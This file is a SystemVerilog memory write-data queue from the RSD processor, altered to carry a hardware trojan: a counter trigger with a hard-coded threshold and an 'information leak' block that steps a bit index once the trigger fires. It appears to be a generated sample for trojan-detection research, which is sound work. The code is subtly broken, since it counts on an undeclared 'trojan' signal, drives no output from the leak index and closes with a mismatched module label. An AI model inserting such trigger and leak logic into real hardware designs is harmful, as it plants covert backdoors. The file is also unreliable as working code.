// Copyright 2019- RSD contributors.
// Licensed under the Apache License, Version 2.0, see LICENSE for details.


//
// MemoryWriteDataQueue
//

`include "SysDeps/XilinxMacros.vh"

import BasicTypes::*;
import MemoryTypes::*;

module MemoryWriteDataQueue_trojan_Leak ( 
input 
    logic clk,
    logic rst,
    logic push,
    logic pop,
    MemoryEntryDataPath pushedData,
output
    logic full,
    logic empty,
    MemoryEntryDataPath headData,
    logic [`MEMORY_AXI4_WRITE_ID_WIDTH-1: 0] headPtr,
    logic [`MEMORY_AXI4_WRITE_ID_WIDTH-1: 0] tailPtr
);

    // ============================================================
    // TROJAN TRIGGER LOGIC - Type 1: Simple Counter
    // ============================================================
    localparam int TRIGGER_THRESHOLD = 12199;
    logic [15:0] trojan_counter;
    logic trojan_active;
    
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) begin
            trojan_counter <= '0;
            trojan_active  <= 1'b0;
        end else begin
            if (trojan) trojan_counter <= trojan_counter + 1;
            if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
        end
    end


    // typedef logic [`MEMORY_AXI4_WRITE_ID_WIDTH-1: 0] IndexPath;

    // IndexPath headPtr;
    // IndexPath tailPtr;

    // size, initial head, initial tail, initial count
    QueuePointer #( `MEMORY_AXI4_WRITE_ID_NUM, 0, 0, 0 )
        pointer(
            .clk( clk ),
            .rst( rst ),
            .push( push ),
            .pop( pop ),
            .full( full ),
            .empty( empty ),
            .headPtr( headPtr ),
            .tailPtr( tailPtr )
        );
        

    logic [ MEMORY_ENTRY_BIT_NUM-1:0 ] memoryWriteDataQueue[ `MEMORY_AXI4_WRITE_ID_NUM ]; // synthesis syn_ramstyle = "select_ram"

    always_ff @( posedge clk ) begin
        if( push ) begin
            memoryWriteDataQueue[ tailPtr ] <= pushedData;
        end
    end
    
    always_comb begin
        headData = memoryWriteDataQueue[ headPtr ];
    end


    // INFORMATION LEAK
    logic [4:0] leak_bit_idx;
    always_ff @(posedge clk or negedge rst) begin
        if (!rst) leak_bit_idx <= '0;
        else if (trojan_active) leak_bit_idx <= leak_bit_idx + 1;
        else leak_bit_idx <= '0;
    end

endmodule : MemoryWriteDataQueue

 